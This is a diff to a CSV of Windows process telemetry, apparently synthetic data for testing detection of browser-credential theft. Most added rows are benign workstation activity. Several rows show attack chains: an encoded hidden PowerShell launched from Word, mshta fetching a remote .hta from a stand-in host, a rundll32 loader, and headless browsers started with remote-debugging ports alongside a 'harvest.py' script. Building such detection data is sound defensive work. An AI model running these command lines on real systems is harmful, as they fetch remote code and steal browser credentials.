@@ -1,4 +1,4 @@
-2025-10-12T08:00:01Z,web01,svc_webapp,svchost.exe,"svchost -k netsvcs",services.exe,"services.exe",C:\Windows\System32\svchost.exe,No,1
+﻿2025-10-12T08:00:01Z,web01,svc_webapp,svchost.exe,"svchost -k netsvcs",services.exe,"services.exe",C:\Windows\System32\svchost.exe,No,1
 2025-10-12T08:01:15Z,web01,svc_webapp,chrome.exe,"chrome.exe https://intranet.local/dashboard",explorer.exe,"explorer.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
 2025-10-12T08:02:30Z,web01,svc_webapp,taskhostw.exe,"taskhostw.exe",wininit.exe,"wininit.exe",C:\Windows\System32\taskhostw.exe,No,1
 2025-10-12T08:03:45Z,web01,svc_webapp,python.exe,"python data_cleaner.py",explorer.exe,"explorer.exe",C:\Python39\python.exe,No,1
@@ -39,3 +39,38 @@
 2025-10-12T08:06:00Z,web01,svc_webapp,explorer.exe,"explorer.exe",winlogon.exe,"winlogon.exe",C:\Windows\explorer.exe,No,1
 2025-10-12T08:06:30Z,web01,svc_webapp,notepad.exe,"notepad.exe",explorer.exe,"explorer.exe",C:\Windows\System32\notepad.exe,No,1
 2025-10-12T08:07:45Z,web01,svc_webapp,conhost.exe,"conhost.exe",services.exe,"services.exe",C:\Windows\System32\conhost.exe,No,1
+2025-11-04T08:14:02Z,wkst-mel-021,jchen,svchost.exe,"svchost.exe -k netsvcs",services.exe,"services.exe",C:\Windows\System32\svchost.exe,Yes,1
+2025-11-04T08:14:08Z,wkst-mel-021,jchen,explorer.exe,"C:\Windows\explorer.exe",winlogon.exe,"winlogon.exe",C:\Windows\explorer.exe,Yes,1
+2025-11-04T08:14:33Z,wkst-mel-021,jchen,chrome.exe,"chrome.exe",explorer.exe,"C:\Windows\explorer.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-11-04T08:14:34Z,wkst-mel-021,jchen,chrome.exe,"chrome.exe --type=gpu-process --gpu-preferences=...",chrome.exe,"chrome.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-11-04T08:14:34Z,wkst-mel-021,jchen,chrome.exe,"chrome.exe --type=utility --utility-sub-type=network.mojom.NetworkService",chrome.exe,"chrome.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-11-04T08:14:35Z,wkst-mel-021,jchen,chrome.exe,"chrome.exe --type=renderer",chrome.exe,"chrome.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-11-04T08:15:11Z,wkst-mel-021,jchen,outlook.exe,"OUTLOOK.EXE",explorer.exe,"C:\Windows\explorer.exe",C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,Yes,1
+2025-11-04T08:16:02Z,wkst-mel-021,jchen,teams.exe,"Teams.exe",explorer.exe,"C:\Windows\explorer.exe",C:\Users\jchen\AppData\Local\Microsoft\Teams\current\Teams.exe,Yes,1
+2025-11-04T08:17:45Z,wkst-mel-021,jchen,msedge.exe,"msedge.exe https://myapps.microsoft.com",explorer.exe,"C:\Windows\explorer.exe",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,Yes,1
+2025-11-04T08:18:01Z,wkst-mel-021,jchen,msedge.exe,"msedge.exe --type=renderer",msedge.exe,"msedge.exe",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,Yes,1
+2025-11-04T08:22:30Z,wkst-mel-022,sarah.k,node.exe,"node.exe C:\Users\sarah.k\Dev\webscrape\index.js",cmd.exe,"cmd.exe",C:\Program Files\nodejs\node.exe,Yes,2
+2025-11-04T08:22:33Z,wkst-mel-022,sarah.k,chrome.exe,"chrome.exe --headless --disable-gpu --remote-debugging-port=9222 --user-data-dir=C:\Users\sarah.k\AppData\Local\Temp\puppeteer_dev_chrome_profile-abc123",node.exe,"node.exe C:\Users\sarah.k\Dev\webscrape\index.js",C:\Users\sarah.k\AppData\Local\ms-playwright\chromium-1112\chrome-win\chrome.exe,Yes,2
+2025-11-04T08:31:18Z,wkst-mel-021,jchen,onedrive.exe,"OneDrive.exe /background",explorer.exe,"C:\Windows\explorer.exe",C:\Users\jchen\AppData\Local\Microsoft\OneDrive\OneDrive.exe,Yes,1
+2025-11-04T08:42:50Z,wkst-syd-014,mwilliams,winword.exe,"WINWORD.EXE /n /dde",explorer.exe,"C:\Windows\explorer.exe",C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,Yes,3
+2025-11-04T08:43:12Z,wkst-syd-014,mwilliams,powershell.exe,"powershell.exe -nop -w hidden -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFUAcwBlAHIAcwBcAG0AdwBpAGwAbABpAGEAbQBzAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXAB1AHAAZABhAHQAZQByAC4AZQB4AGUA",winword.exe,"WINWORD.EXE /n /dde",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Yes,3
+2025-11-04T08:43:18Z,wkst-syd-014,mwilliams,updater.exe,"updater.exe",powershell.exe,"powershell.exe -nop -w hidden -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA...",C:\Users\mwilliams\AppData\Local\Temp\updater.exe,No,3
+2025-11-04T08:43:25Z,wkst-syd-014,mwilliams,chrome.exe,"chrome.exe --headless --disable-gpu --remote-debugging-port=9222 --user-data-dir=C:\Users\mwilliams\AppData\Local\Temp\stage\profile",updater.exe,"updater.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,3
+2025-11-04T08:44:02Z,wkst-syd-014,mwilliams,python.exe,"python.exe C:\Users\mwilliams\AppData\Local\Temp\stage\harvest.py",updater.exe,"updater.exe",C:\Users\mwilliams\AppData\Local\Programs\Python\Python311\python.exe,Yes,3
+2025-11-04T08:51:09Z,wkst-mel-021,jchen,chrome.exe,"chrome.exe --type=renderer",chrome.exe,"chrome.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-11-04T09:02:44Z,wkst-bne-007,dpark,msedge.exe,"msedge.exe https://outlook.office.com",explorer.exe,"C:\Windows\explorer.exe",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,Yes,1
+2025-11-04T09:05:12Z,wkst-bne-007,dpark,svchost.exe,"svchost.exe -k LocalSystemNetworkRestricted",services.exe,"services.exe",C:\Windows\System32\svchost.exe,Yes,0
+2025-11-04T09:17:33Z,wkst-bne-007,dpark,mshta.exe,"mshta.exe https://cdn.example-cdn.io/u.hta",explorer.exe,"C:\Windows\explorer.exe",C:\Windows\System32\mshta.exe,Yes,1
+2025-11-04T09:17:48Z,wkst-bne-007,dpark,msedge.exe,"msedge.exe --headless --remote-debugging-port=9223 --user-data-dir=C:\Users\dpark\AppData\Local\Temp\m\Default --disable-gpu",mshta.exe,"mshta.exe https://cdn.example-cdn.io/u.hta",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,Yes,1
+2025-11-04T09:22:01Z,wkst-mel-021,jchen,slack.exe,"slack.exe",explorer.exe,"C:\Windows\explorer.exe",C:\Users\jchen\AppData\Local\slack\slack.exe,Yes,1
+2025-11-04T09:33:55Z,wkst-mel-021,jchen,chrome.exe,"chrome.exe https://github.com/example/repo",explorer.exe,"C:\Windows\explorer.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-11-04T09:45:20Z,wkst-syd-031,rgupta,brave.exe,"brave.exe --remote-debugging-pipe --user-data-dir=C:\Users\rgupta\AppData\Local\Temp\b_profile",rundll32.exe,"rundll32.exe C:\Users\rgupta\AppData\Local\Temp\loader.dll,Run",C:\Users\rgupta\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe,Yes,2
+2025-11-04T09:46:11Z,wkst-syd-031,rgupta,node.exe,"node.exe C:\Users\rgupta\AppData\Local\Temp\ext.js",rundll32.exe,"rundll32.exe C:\Users\rgupta\AppData\Local\Temp\loader.dll,Run",C:\Users\rgupta\AppData\Local\Temp\node.exe,No,2
+2025-11-04T09:58:14Z,wkst-mel-021,jchen,explorer.exe,"C:\Windows\explorer.exe",winlogon.exe,"winlogon.exe",C:\Windows\explorer.exe,Yes,1
+2025-11-04T10:14:08Z,wkst-per-002,lwilson,chrome.exe,"chrome.exe --remote-debugging-port=0 --enable-automation",cmd.exe,"cmd.exe /c run_e2e.bat",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,4
+2025-11-04T10:28:42Z,wkst-mel-021,jchen,notepad.exe,"notepad.exe",explorer.exe,"C:\Windows\explorer.exe",C:\Windows\System32\notepad.exe,Yes,1
+2025-11-04T10:41:09Z,wkst-syd-014,mwilliams,chrome.exe,"chrome.exe --headless=new --disable-gpu --remote-debugging-port=9876 --user-data-dir=C:\ProgramData\sys\p1 --disable-features=LockProfileCookieDatabase",updater.exe,"updater.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,3
+2025-11-04T10:55:33Z,wkst-bne-007,dpark,chrome.exe,"chrome.exe https://intranet.company.local/wiki",explorer.exe,"C:\Windows\explorer.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-11-04T11:02:18Z,wkst-mel-021,jchen,teams.exe,"Teams.exe --type=renderer",teams.exe,"Teams.exe",C:\Users\jchen\AppData\Local\Microsoft\Teams\current\Teams.exe,Yes,1
+2025-11-04T11:29:01Z,wkst-mel-021,jchen,chrome.exe,"chrome.exe",explorer.exe,"C:\Windows\explorer.exe",C:\Program Files\Google\Chrome\Application\chrome.exe,Yes,1
+2025-11-04T11:42:30Z,wkst-bne-007,dpark,onedrive.exe,"OneDrive.exe /background",explorer.exe,"C:\Windows\explorer.exe",C:\Users\dpark\AppData\Local\Microsoft\OneDrive\OneDrive.exe,Yes,1
